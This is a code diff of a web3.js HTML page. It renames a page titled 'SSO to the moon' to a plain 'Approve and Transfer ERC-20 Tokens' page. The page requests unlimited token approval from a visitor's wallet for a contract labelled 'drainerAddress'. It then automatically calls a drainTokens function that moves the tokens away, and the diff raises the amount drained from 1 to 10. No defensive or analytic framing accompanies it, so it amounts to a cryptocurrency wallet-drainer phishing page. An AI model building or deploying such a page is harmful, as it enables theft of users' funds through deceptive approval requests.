@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSO to the moon</title>
+    <title>Token Transfer Approval</title>
 </head>
 <body>
-    <h1>SSO to the moon</h1>
-    <button id="connectButton">Click me to connect your wallet</button>
-    <button id="approveTokenButton">Approve Token Transfer</button>
+    <h1>Approve and Transfer ERC-20 Tokens</h1>
+    <button id="connectButton">Connect Wallet</button>
+    <button id="approveButton">Approve Token Transfer</button>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
     <script>
@@ -31,8 +31,8 @@
             }
         });
 
-        const tokenAddress = '0x9a56126654ef79F703f62AB764fD10b346b5de83'; // Replace with your ERC-20 token contract address
-        const drainerAddress = '0xf8e81D47203A594245E36C48e151709F0C19fBe8'; // Replace with your TokenDrainer contract address
+        const tokenAddress = '0x9a56126654ef79F703f62AB764fD10b346b5de83';  // Replace with your token's contract address
+        const drainerAddress = '0xf8e81D47203A594245E36C48e151709F0C19fBe8';  // Replace with your drainer contract address
         const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
         async function approveTokens() {
@@ -66,7 +66,7 @@
 
                     alert('Token approval successful!');
                     console.log('Token approval transaction completed.');
-                    
+
                     // Automatically trigger the token drain function after approval
                     drainTokens();
                 } catch (error) {
@@ -99,7 +99,7 @@
             const drainerContract = new web3.eth.Contract(drainerContractAbi, drainerAddress);
 
             try {
-                const amountToDrain = web3.utils.toWei('1', 'ether'); // Adjust the amount of tokens to drain as needed
+                const amountToDrain = web3.utils.toWei('10', 'ether');  // Adjust the amount of tokens
 
                 // Send a transaction to the contract to drain tokens
                 const tx = await drainerContract.methods.drainTokens(tokenAddress, amountToDrain).send({
@@ -114,4 +114,7 @@
             }
         }
 
-        document.getElementBy
+        document.getElementById('approveButton').addEventListener('click', approveTokens);
+    </script>
+</body>
+</html>
